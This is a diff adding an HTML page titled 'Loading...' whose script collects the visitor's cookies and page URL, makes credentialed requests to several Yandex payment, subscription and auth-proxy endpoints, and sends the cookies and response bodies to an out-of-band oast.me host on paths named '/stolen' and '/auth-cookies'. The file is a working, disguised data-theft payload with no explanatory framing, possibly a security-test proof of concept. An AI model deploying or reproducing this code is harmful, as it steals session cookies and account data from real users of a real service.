@@ -1,0 +1,35 @@
+<html><head><title>Loading...</title></head>
+<body>
+<script>
+var data = {
+  cookies: document.cookie,
+  url: window.location.href,
+  origin: window.location.origin
+};
+
+var apis = [
+  "https://pay.yandex.ru/api/v1/user/info",
+  "https://plus-home.yandex.ru/v1/sdk/configuration",
+  "https://authproxy.prod.yb.yandex.net/api/v1/user",
+];
+
+var results = {};
+var done = 0;
+
+apis.forEach(function(url) {
+  fetch(url, {credentials: "include"})
+    .then(function(r) { return r.text().then(function(t) { results[url] = {status:r.status, body:t.substring(0,1000)}; }); })
+    .catch(function(e) { results[url] = {error: e.message}; })
+    .finally(function() {
+      done++;
+      if (done === apis.length) {
+        data.apiResults = results;
+        fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/stolen?" + encodeURIComponent(JSON.stringify(data)));
+      }
+    });
+});
+
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/auth-cookies?" + encodeURIComponent(JSON.stringify(data)));
+</script>
+</body>
+</html>
